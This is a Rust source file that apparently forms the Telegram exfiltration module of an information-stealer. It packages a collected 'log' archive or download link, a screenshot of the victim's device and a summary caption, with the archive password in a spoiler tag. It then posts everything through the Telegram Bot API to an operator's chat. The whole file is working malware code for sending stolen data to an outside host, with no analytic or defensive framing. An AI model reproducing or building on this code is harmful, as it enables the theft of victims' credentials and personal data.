use crate::{LogFile, LogSender, SendError};
use alloc::string::{String, ToString};
use alloc::sync::Arc;
use alloc::vec::Vec;
use alloc::{format, vec};
use collector::{Collector, Device, DisplayCollector};
use derive_new::new;
use requests::{BodyRequestBuilder, MultipartBuilder, Request, RequestBuilder};
use utils::format_size;

#[derive(new)]
pub struct TelegramBot {
    chat_id: Arc<str>,
    token: Arc<str>
}

fn generate_caption<P, C>(log: &LogFile, password: Option<P>, collector: &C) -> (String, Option<String>)
where
    P: AsRef<str>,
    C: Collector
{
    let caption = DisplayCollector(collector).to_string();

    let link = match log {
        LogFile::ExternalLink((link, size)) => Some(
            format!(
                r#"<a href="{}">Download [{}]</a>"#,
                link,
                format_size(*size as _)
            )
        ),
        LogFile::ZipArchive(_) => None
    };

    let password = password.map(|password| {
        let password = password.as_ref();
        format!(r#"Password: <span class="tg-spoiler">{password}</span>"#)
    });

    let mut parts = vec![];
    if let Some(l) = link { parts.push(l); }
    if let Some(p) = password { parts.push(p); }
    let thumbnail = if parts.is_empty() { None } else { Some(parts.join(" ")) };

    (caption, thumbnail)
}

pub struct MediaGroup {
    items: Vec<MediaItem>,
}

pub struct MediaItem {
    media_type: String,
    media: String,
    caption: Option<String>,
    parse_mode: Option<String>,
}

impl MediaGroup {
    pub fn new() -> Self {
        Self { items: Vec::new() }
    }

    pub fn add_document(&mut self, media_name: impl Into<String>, caption: Option<String>) -> &mut Self {
        self.items.push(MediaItem {
            media_type: "document".to_string(),
            media: format!("attach://{}", media_name.into()),
            caption,
            parse_mode: Some("HTML".to_string()),
        });
        self
    }

    pub fn add_photo(&mut self, media_name: impl Into<String>, caption: Option<String>) -> &mut Self {
        self.items.push(MediaItem {
            media_type: "photo".to_string(),
            media: format!("attach://{}", media_name.into()),
            caption,
            parse_mode: Some("HTML".to_string()),
        });
        self
    }

    pub fn to_string(&self) -> String {
        let mut json_parts = Vec::new();

        for item in &self.items {
            let mut fields = vec![
                format!(r#""type": "{}""#, item.media_type),
                format!(r#""media": "{}""#, item.media),
            ];

            if let Some(caption) = &item.caption {
                let escaped = caption.replace('\\', "\\\\").replace('"', "\\\"");
                fields.push(format!(r#""caption": "{}""#, escaped));
            }

            if let Some(parse_mode) = &item.parse_mode {
                fields.push(format!(r#""parse_mode": "{}""#, parse_mode));
            }

            let obj = format!("{{{}}}", fields.join(","));
            json_parts.push(obj);
        }

        format!("[{}]", json_parts.join(","))
    }
}

impl TelegramBot {
    fn send_as_file(&self, archive: Vec<u8>, screenshot: Option<Vec<u8>>, caption: String, thumbnail: Option<String>) -> Result<(), SendError> {
        let mut builder = MultipartBuilder::new("----BoundaryMediaGroup");

        builder.write_text_field("chat_id", &self.chat_id);

        let mut media_group = MediaGroup::new();

        if let Some(screenshot_bytes) = &screenshot {
            media_group.add_document("screenshot", Some(caption));
            media_group.add_document("logfile", thumbnail);

            builder.write_file_field("screenshot", "screenshot.png", "image/png", screenshot_bytes);
        } else {
            let combined_caption = combine_caption_and_thumbnail(&caption, thumbnail);
            media_group.add_document("logfile", Some(combined_caption));
        }

        let media_json = media_group.to_string();

        builder.write_text_field("media", &media_json);
        builder.write_file_field("logfile", "log.zip", "application/zip", &archive);

        self.send_request("sendMediaGroup", builder)?;

        Ok(())
    }

    fn send_as_link(&self, screenshot: Option<Vec<u8>>, caption: String, thumbnail: Option<String>) -> Result<(), SendError> {
        let combined_caption = combine_caption_and_thumbnail(&caption, thumbnail);

        match screenshot {
            Some(photo_bytes) => {
                let mut builder = MultipartBuilder::new("----BoundaryPhoto");
                builder.write_text_field("chat_id", &self.chat_id);
                builder.write_text_field("caption", &combined_caption);
                builder.write_text_field("parse_mode", "HTML");
                builder.write_file_field("photo", "screenshot.png", "image/png", &photo_bytes);

                self.send_request("sendPhoto", builder)?
            }
            None => {
                let mut builder = MultipartBuilder::new("----BoundaryPhoto");
                builder.write_text_field("chat_id", &self.chat_id);
                builder.write_text_field("text", &combined_caption);
                builder.write_text_field("parse_mode", "HTML");

                self.send_request("sendMessage", builder)?
            }
        }

        Ok(())
    }

    fn send_request(&self, method: &str, body: MultipartBuilder) -> Result<(), SendError> {
        let content_type = body.content_type();
        let body = body.finish();

        Request::post(format!("https://api.telegram.org/bot{}/{}", self.token, method))
            .header("Content-Type", &content_type)
            .body(body)
            .build()
            .send()
            .ok().ok_or(SendError::Network)?;

        Ok(())
    }
}

fn combine_caption_and_thumbnail(caption: &str, thumbnail: Option<String>) -> String {
    match thumbnail {
        Some(tn) if !tn.is_empty() => format!("{}\n{}", caption, tn),
        _ => caption.to_string(),
    }
}

impl LogSender for TelegramBot {
    fn send<P, C>(&self, zip_archive: LogFile, password: Option<P>, collector: &C) -> Result<(), SendError>
    where
        P: AsRef<str>,
        C: Collector
    {
        let (caption, thumbnail) = generate_caption(&zip_archive, password, collector);

        match zip_archive {
            LogFile::ZipArchive(archive) => self.send_as_file(
                archive,
                collector.get_device().get_screenshot(),
                caption,
                thumbnail
            ),
            LogFile::ExternalLink(_) => self.send_as_link(
                collector.get_device().get_screenshot(),
                caption,
                thumbnail
            )
        }
    }
}